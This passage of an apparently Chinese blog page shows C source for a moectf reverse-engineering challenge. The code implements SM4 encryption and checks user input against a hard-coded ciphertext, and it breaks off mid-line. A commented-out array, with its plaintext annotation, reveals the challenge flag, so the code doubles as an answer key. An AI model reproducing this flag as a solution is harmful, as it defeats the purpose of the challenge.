class="number">0x1a</span>,<span class="number">0x55</span>,<span class="number">0xad</span>,<span class="number">0x93</span>,<span class="number">0x32</span>,<span class="number">0x30</span>,<span class="number">0xf5</span>,<span class="number">0x8c</span>,<span class="number">0xb1</span>,<span class="number">0xe3</span>,</span><br><span class="line">        <span class="number">0x1d</span>,<span class="number">0xf6</span>,<span class="number">0xe2</span>,<span class="number">0x2e</span>,<span class="number">0x82</span>,<span class="number">0x66</span>,<span class="number">0xca</span>,<span class="number">0x60</span>,<span class="number">0xc0</span>,<span class="number">0x29</span>,<span class="number">0x23</span>,<span class="number">0xab</span>,<span class="number">0x0d</span>,<span class="number">0x53</span>,<span class="number">0x4e</span>,<span class="number">0x6f</span>,</span><br><span class="line">        <span class="number">0xd5</span>,<span class="number">0xdb</span>,<span class="number">0x37</span>,<span class="number">0x45</span>,<span class="number">0xde</span>,<span class="number">0xfd</span>,<span class="number">0x8e</span>,<span class="number">0x2f</span>,<span class="number">0x03</span>,<span class="number">0xff</span>,<span class="number">0x6a</span>,<span class="number">0x72</span>,<span class="number">0x6d</span>,<span class="number">0x6c</span>,<span class="number">0x5b</span>,<span class="number">0x51</span>,</span><br><span class="line">        <span class="number">0x8d</span>,<span class="number">0x1b</span>,<span class="number">0xaf</span>,<span class="number">0x92</span>,<span class="number">0xbb</span>,<span class="number">0xdd</span>,<span class="number">0xbc</span>,<span class="number">0x7f</span>,<span class="number">0x11</span>,<span class="number">0xd9</span>,<span class="number">0x5c</span>,<span class="number">0x41</span>,<span class="number">0x1f</span>,<span class="number">0x10</span>,<span class="number">0x5a</span>,<span class="number">0xd8</span>,</span><br><span class="line">        <span class="number">0x0a</span>,<span class="number">0xc1</span>,<span class="number">0x31</span>,<span class="number">0x88</span>,<span class="number">0xa5</span>,<span class="number">0xcd</span>,<span class="number">0x7b</span>,<span class="number">0xbd</span>,<span class="number">0x2d</span>,<span class="number">0x74</span>,<span class="number">0xd0</span>,<span class="number">0x12</span>,<span class="number">0xb8</span>,<span class="number">0xe5</span>,<span class="number">0xb4</span>,<span class="number">0xb0</span>,</span><br><span class="line">        <span class="number">0x89</span>,<span class="number">0x69</span>,<span class="number">0x97</span>,<span class="number">0x4a</span>,<span class="number">0x0c</span>,<span class="number">0x96</span>,<span class="number">0x77</span>,<span class="number">0x7e</span>,<span class="number">0x65</span>,<span class="number">0xb9</span>,<span class="number">0xf1</span>,<span class="number">0x09</span>,<span class="number">0xc5</span>,<span class="number">0x6e</span>,<span class="number">0xc6</span>,<span class="number">0x84</span>,</span><br><span class="line">        <span class="number">0x18</span>,<span class="number">0xf0</span>,<span class="number">0x7d</span>,<span class="number">0xec</span>,<span class="number">0x3a</span>,<span class="number">0xdc</span>,<span class="number">0x4d</span>,<span class="number">0x20</span>,<span class="number">0x79</span>,<span class="number">0xee</span>,<span class="number">0x5f</span>,<span class="number">0x3e</span>,<span class="number">0xd7</span>,<span class="number">0xcb</span>,<span class="number">0x39</span>,<span class="number">0x48</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>主程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;sm4.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//4字节无符号数组转无符号long型</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">four_uCh2uLong</span><span class="params">(u8 *in, u32 *out)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        *out = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">                *out = ((u32)in[i] &lt;&lt; (<span class="number">24</span> - i * <span class="number">8</span>)) ^ *out;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无符号long型转4字节无符号数组</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">uLong2four_uCh</span><span class="params">(u32 in, u8 *out)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//从32位unsigned long的高位开始取</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">                *(out + i) = (u32)(in &gt;&gt; (<span class="number">24</span> - i * <span class="number">8</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//左移，保留丢弃位放置尾部</span></span><br><span class="line">u32 <span class="title function_">move</span><span class="params">(u32 data, <span class="type">int</span> length)</span></span><br><span class="line">&#123;</span><br><span class="line">        u32 result = <span class="number">0</span>;</span><br><span class="line">        result = (data &lt;&lt; length) ^ (data &gt;&gt; (<span class="number">32</span> - length));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//秘钥处理函数,先使用Sbox进行非线性变化，再将线性变换L置换为L&#x27;</span></span><br><span class="line">u32 <span class="title function_">func_key</span><span class="params">(u32 input)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        u32 ulTmp = <span class="number">0</span>;</span><br><span class="line">        u8 ucIndexList[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        u8 ucSboxValueList[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        uLong2four_uCh(input, ucIndexList);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        four_uCh2uLong(ucSboxValueList, &amp;ulTmp);</span><br><span class="line">        ulTmp = ulTmp ^ move(ulTmp, <span class="number">13</span>) ^ move(ulTmp, <span class="number">23</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ulTmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加解密数据处理函数,先使用Sbox进行非线性变化，再进行线性变换L</span></span><br><span class="line">u32 <span class="title function_">func_data</span><span class="params">(u32 input)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        u32 ulTmp = <span class="number">0</span>;</span><br><span class="line">        u8 ucIndexList[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        u8 ucSboxValueList[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">        uLong2four_uCh(input, ucIndexList);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                ucSboxValueList[i] = TBL_SBOX[ucIndexList[i]];</span><br><span class="line">        &#125;</span><br><span class="line">        four_uCh2uLong(ucSboxValueList, &amp;ulTmp);</span><br><span class="line">        ulTmp = ulTmp ^ move(ulTmp, <span class="number">2</span>) ^ move(ulTmp, <span class="number">10</span>) ^ move(ulTmp, <span class="number">18</span>) ^ move(ulTmp, <span class="number">24</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ulTmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//加密函数（可以加密任意长度数据，16字节为一次循环，不足部分补0凑齐16字节的整数倍）</span></span><br><span class="line"><span class="comment">//len:数据长度(任意长度数据) key:密钥（16字节） input:输入的原始数据 output:加密后输出数据</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">encode_fun</span><span class="params">(u8 len,u8 *key, u8 *input, u8 *output)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>,j=<span class="number">0</span>; </span><br><span class="line">        u8 *p = (u8 *)<span class="built_in">malloc</span>(<span class="number">50</span>);      <span class="comment">//定义一个50字节缓存区</span></span><br><span class="line">        u32 ulKeyTmpList[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;   <span class="comment">//存储密钥的u32数据</span></span><br><span class="line">        u32 ulKeyList[<span class="number">36</span>] = &#123; <span class="number">0</span> &#125;;     <span class="comment">//用于密钥扩展算法与系统参数FK运算后的结果存储</span></span><br><span class="line">        u32 ulDataList[<span class="number">36</span>] = &#123; <span class="number">0</span> &#125;;    <span class="comment">//用于存放加密数据</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/***************************开始生成子秘钥********************************************/</span></span><br><span class="line">        four_uCh2uLong(key, &amp;(ulKeyTmpList[<span class="number">0</span>]));</span><br><span class="line">        four_uCh2uLong(key + <span class="number">4</span>, &amp;(ulKeyTmpList[<span class="number">1</span>]));</span><br><span class="line">        four_uCh2uLong(key + <span class="number">8</span>, &amp;(ulKeyTmpList[<span class="number">2</span>]));</span><br><span class="line">        four_uCh2uLong(key + <span class="number">12</span>, &amp;(ulKeyTmpList[<span class="number">3</span>]));</span><br><span class="line"></span><br><span class="line">        ulKeyList[<span class="number">0</span>] = ulKeyTmpList[<span class="number">0</span>] ^ TBL_SYS_PARAMS[<span class="number">0</span>];</span><br><span class="line">        ulKeyList[<span class="number">1</span>] = ulKeyTmpList[<span class="number">1</span>] ^ TBL_SYS_PARAMS[<span class="number">1</span>];</span><br><span class="line">        ulKeyList[<span class="number">2</span>] = ulKeyTmpList[<span class="number">2</span>] ^ TBL_SYS_PARAMS[<span class="number">2</span>];</span><br><span class="line">        ulKeyList[<span class="number">3</span>] = ulKeyTmpList[<span class="number">3</span>] ^ TBL_SYS_PARAMS[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)             <span class="comment">//32次循环迭代运算</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="comment">//5-36为32个子秘钥</span></span><br><span class="line">                ulKeyList[i + <span class="number">4</span>] = ulKeyList[i] ^ func_key(ulKeyList[i + <span class="number">1</span>] ^ ulKeyList[i + <span class="number">2</span>] ^ ulKeyList[i + <span class="number">3</span>] ^ TBL_FIX_PARAMS[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/***********************************生成32轮32位长子秘钥结束**********************************/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)        <span class="comment">//将输入数据存放在p缓存区</span></span><br><span class="line">                *(p + i) = *(input + i);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">16</span>-len % <span class="number">16</span>; i++)<span class="comment">//将不足16位补0凑齐16的整数倍</span></span><br><span class="line">                *(p + len + i) = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len / <span class="number">16</span> + ((len % <span class="number">16</span>) ? <span class="number">1</span>:<span class="number">0</span>); j++)  <span class="comment">//进行循环加密,并将加密后数据保存（可以看出此处是以16字节为一次加密，进行循环，即若16字节则进行一次，17字节补0至32字节后进行加密两次，以此类推）</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="comment">/*开始处理加密数据*/</span></span><br><span class="line">                four_uCh2uLong(p + <span class="number">16</span> * j, &amp;(ulDataList[<span class="number">0</span>]));</span><br><span class="line">                four_uCh2uLong(p + <span class="number">16</span> * j + <span class="number">4</span>, &amp;(ulDataList[<span class="number">1</span>]));</span><br><span class="line">                four_uCh2uLong(p + <span class="number">16</span> * j + <span class="number">8</span>, &amp;(ulDataList[<span class="number">2</span>]));</span><br><span class="line">                four_uCh2uLong(p + <span class="number">16</span> * j + <span class="number">12</span>, &amp;(ulDataList[<span class="number">3</span>]));</span><br><span class="line">                <span class="comment">//加密</span></span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                        ulDataList[i + <span class="number">4</span>] = ulDataList[i] ^ func_data(ulDataList[i + <span class="number">1</span>] ^ ulDataList[i + <span class="number">2</span>] ^ ulDataList[i + <span class="number">3</span>] ^ ulKeyList[i + <span class="number">4</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/*将加密后数据输出*/</span></span><br><span class="line">                uLong2four_uCh(ulDataList[<span class="number">35</span>], output + <span class="number">16</span> * j);</span><br><span class="line">                uLong2four_uCh(ulDataList[<span class="number">34</span>], output + <span class="number">16</span> * j + <span class="number">4</span>);</span><br><span class="line">                uLong2four_uCh(ulDataList[<span class="number">33</span>], output + <span class="number">16</span> * j + <span class="number">8</span>);</span><br><span class="line">                uLong2four_uCh(ulDataList[<span class="number">32</span>], output + <span class="number">16</span> * j + <span class="number">12</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//解密函数（与加密函数基本一致，只是秘钥使用的顺序不同，即把钥匙反着用就是解密）</span></span><br><span class="line"><span class="comment">//len:数据长度 key:密钥 input:输入的加密后数据 output:输出的解密后数据</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">decode_fun</span><span class="params">(u8 len,u8 *key, u8 *input, u8 *output)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        u32 ulKeyTmpList[<span class="number">4</span>] = &#123; <span class="number">0</span> &#125;;<span class="comment">//存储密钥的u32数据</span></span><br><span class="line">        u32 ulKeyList[<span class="number">36</span>] = &#123; <span class="number">0</span> &#125;;  <span class="comment">//用于密钥扩展算法与系统参数FK运算后的结果存储</span></span><br><span class="line">        u32 ulDataList[<span class="number">36</span>] = &#123; <span class="number">0</span> &#125;; <span class="comment">//用于存放加密数据</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/*开始生成子秘钥*/</span></span><br><span class="line">        four_uCh2uLong(key, &amp;(ulKeyTmpList[<span class="number">0</span>]));</span><br><span class="line">        four_uCh2uLong(key + <span class="number">4</span>, &amp;(ulKeyTmpList[<span class="number">1</span>]));</span><br><span class="line">        four_uCh2uLong(key + <span class="number">8</span>, &amp;(ulKeyTmpList[<span class="number">2</span>]));</span><br><span class="line">        four_uCh2uLong(key + <span class="number">12</span>, &amp;(ulKeyTmpList[<span class="number">3</span>]));</span><br><span class="line"></span><br><span class="line">        ulKeyList[<span class="number">0</span>] = ulKeyTmpList[<span class="number">0</span>] ^ TBL_SYS_PARAMS[<span class="number">0</span>];</span><br><span class="line">        ulKeyList[<span class="number">1</span>] = ulKeyTmpList[<span class="number">1</span>] ^ TBL_SYS_PARAMS[<span class="number">1</span>];</span><br><span class="line">        ulKeyList[<span class="number">2</span>] = ulKeyTmpList[<span class="number">2</span>] ^ TBL_SYS_PARAMS[<span class="number">2</span>];</span><br><span class="line">        ulKeyList[<span class="number">3</span>] = ulKeyTmpList[<span class="number">3</span>] ^ TBL_SYS_PARAMS[<span class="number">3</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)             <span class="comment">//32次循环迭代运算</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="comment">//5-36为32个子秘钥</span></span><br><span class="line">                ulKeyList[i + <span class="number">4</span>] = ulKeyList[i] ^ func_key(ulKeyList[i + <span class="number">1</span>] ^ ulKeyList[i + <span class="number">2</span>] ^ ulKeyList[i + <span class="number">3</span>] ^ TBL_FIX_PARAMS[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*生成32轮32位长子秘钥结束*/</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; len / <span class="number">16</span>; j++)  <span class="comment">//进行循环加密,并将加密后数据保存</span></span><br><span class="line">        &#123;</span><br><span class="line">                <span class="comment">/*开始处理解密数据*/</span></span><br><span class="line">                four_uCh2uLong(input + <span class="number">16</span> * j, &amp;(ulDataList[<span class="number">0</span>]));</span><br><span class="line">                four_uCh2uLong(input + <span class="number">16</span> * j + <span class="number">4</span>, &amp;(ulDataList[<span class="number">1</span>]));</span><br><span class="line">                four_uCh2uLong(input + <span class="number">16</span> * j + <span class="number">8</span>, &amp;(ulDataList[<span class="number">2</span>]));</span><br><span class="line">                four_uCh2uLong(input + <span class="number">16</span> * j + <span class="number">12</span>, &amp;(ulDataList[<span class="number">3</span>]));</span><br><span class="line"></span><br><span class="line">                <span class="comment">//解密</span></span><br><span class="line">                <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                        ulDataList[i + <span class="number">4</span>] = ulDataList[i] ^ func_data(ulDataList[i + <span class="number">1</span>] ^ ulDataList[i + <span class="number">2</span>] ^ ulDataList[i + <span class="number">3</span>] ^ ulKeyList[<span class="number">35</span> - i]);<span class="comment">//与加密唯一不同的就是轮密钥的使用顺序</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/*将解密后数据输出*/</span></span><br><span class="line">                uLong2four_uCh(ulDataList[<span class="number">35</span>], output + <span class="number">16</span> * j);</span><br><span class="line">                uLong2four_uCh(ulDataList[<span class="number">34</span>], output + <span class="number">16</span> * j + <span class="number">4</span>);</span><br><span class="line">                uLong2four_uCh(ulDataList[<span class="number">33</span>], output + <span class="number">16</span> * j + <span class="number">8</span>);</span><br><span class="line">                uLong2four_uCh(ulDataList[<span class="number">32</span>], output + <span class="number">16</span> * j + <span class="number">12</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//无符号字符数组转16进制打印</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_hex</span><span class="params">(u8 *data, <span class="type">int</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">        <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> alTmp[<span class="number">16</span>] = &#123; <span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;5&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;7&#x27;</span>,<span class="string">&#x27;8&#x27;</span>,<span class="string">&#x27;9&#x27;</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>,<span class="string">&#x27;c&#x27;</span>,<span class="string">&#x27;d&#x27;</span>,<span class="string">&#x27;e&#x27;</span>,<span class="string">&#x27;f&#x27;</span> &#125;;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, alTmp[data[i] / <span class="number">16</span>]);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, alTmp[data[i] % <span class="number">16</span>]);</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*在主函数中实现任意字节加密与解密，并且结果正确*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">        u8 i,len;</span><br><span class="line">        u8 encode_Result[<span class="number">50</span>] = &#123; <span class="number">0</span> &#125;;    <span class="comment">//定义加密输出缓存区</span></span><br><span class="line">        u8 decode_Result[<span class="number">50</span>] = &#123; <span class="number">0</span> &#125;;    <span class="comment">//定义解密输出缓存区</span></span><br><span class="line">        u8 key[<span class="number">16</span>] = &#123; <span class="number">0x74</span>,<span class="number">0x68</span>,<span class="number">0x65</span>,<span class="number">0x6b</span>,<span class="number">0x65</span>,<span class="number">0x79</span>,<span class="number">0x74</span>,<span class="number">0x6f</span>,<span class="number">0x73</span>,<span class="number">0x6f</span>,<span class="number">0x6d</span>,<span class="number">0x65</span>,<span class="number">0x74</span>,<span class="number">0x68</span>,<span class="number">0x69</span>,<span class="number">0x6e</span> &#125;;       <span class="comment">//定义16字节的密钥</span></span><br><span class="line">    <span class="comment">/*u8 Data_plain[45]=&#123;0x6d,0x6f,0x65,0x63,0x74,0x66,</span></span><br><span class="line"><span class="comment">                             0x7b,0x43,0x6f,0x6e,0x67,0x72,</span></span><br><span class="line"><span class="comment">                                                 0x61,0x74,0x75,0x6c,0x61,0x74,</span></span><br><span class="line"><span class="comment">                                                 0x69,0x6f,0x6e,0x73,0x5f,0x79,</span></span><br><span class="line"><span class="comment">                                                 0x6f,0x75,0x5f,0x61,0x72,0x65,</span></span><br><span class="line"><span class="comment">                                                 0x5f,0x61,0x6e,0x5f,0x53,0x4d,</span></span><br><span class="line"><span class="comment">                                                 0x34,0x5f,0x6d,0x61,0x73,0x74,</span></span><br><span class="line"><span class="comment">                                                 0x65,0x72,0x21,0x21,0x21,0x7d&#125;;//moectf&#123;Congratulations_you_are_an_SM4_master!!!&#125;*/</span></span><br><span class="line">        u8 Data_plain[<span class="number">48</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;please input your flag:\n&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,Data_plain);</span><br><span class="line">        len = <span class="number">16</span> * (<span class="keyword">sizeof</span>(Data_plain) / <span class="number">16</span>) + <span class="number">16</span> * ((<span class="keyword">sizeof</span>(Data_plain) % <span class="number">16</span>) ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        encode_fun(<span class="keyword">sizeof</span>(Data_plain),key, Data_plain, encode_Result);            <span class="comment">//数据加密</span></span><br><span class="line">        <span class="comment">//printf(&quot;加密后数据是：\n&quot;);</span></span><br><span class="line">        <span class="comment">//for (i = 0; i &lt; len ; i++)</span></span><br><span class="line">        <span class="comment">//        printf(&quot;0x%x,&quot;, *(encode_Result + i));</span></span><br><span class="line">        u8 enc[<span class="number">48</span>]=&#123;<span class="number">0xad</span>,<span class="number">0x6c</span>,<span class="number">0xcd</span>,<span class="number">0xc1</span>,<span class="number">0x9</span>,<span class="number">0xfc</span>,<span class="number">0xdd</span>,<span class="number">0xef</span>,<span class="number">0x83</span>,<span class="number">0xae</span>,<span class="number">0x93</span>,<span class="number">0x8</span>,<span class="number">0x53</span>,<span class="number">0x8e</span>,<span class="number">0xc5</span>,<span class="number">0x37</span>,<span class="number">0x5c</span>,<span class="number">0xdd</span>,<span class="number">0x1b</span>,<span class="number">0x4b</span>,<span class="number">0x3</span>,<span class="number">0x99</span>,<span class="number">0x19</span>,<span class="number">0xa2</span>,<span class="number">0x69</span>,<span class="number">0x24</span>,<span class="number">0x96</span>,<span class="number">0x42</span>,<span class="number">0x77</span>,<span class="number">0xc1</span>,<span class="number">0x27</span>,<span class="number">0x5f</span>,<span class="number">0x2d</span>,<span class="number">0xd4</span>,<span class="number">0x5d</span>,<span class="number">0xf5</span>,<span class="number">0x2b</span>,<span class="number">0xb0</span>,<span class="number">0x32</span>,<span class="number">0xf7</span>,<span class="number">0xa5</span>,<span class="number">0x97</span>,<span class="number">0xc6</span>,<span class="number">0x8a</span>,<span class="number">0xee</span>,<span class="number">0x48</span>,<span class="number">0xae</span>,<span class="number">0x93</span>&#125;;                </span><br><span class="line">        decode_fun(len,key, encode_Result, decode_Result);      <span class="comment">//数据解密</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;解密后数据是：\n&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, *(decode_Result + i)); </span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">48</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">if</span>(enc[i]!=*(encode_Result+i))</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="built_in">printf</span>(<span class="string">&quot;Wrong!&quot;</span>);</span><br><span class="line">                        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratulations&quot;</span>);</span><br><span class="line">        system(<span 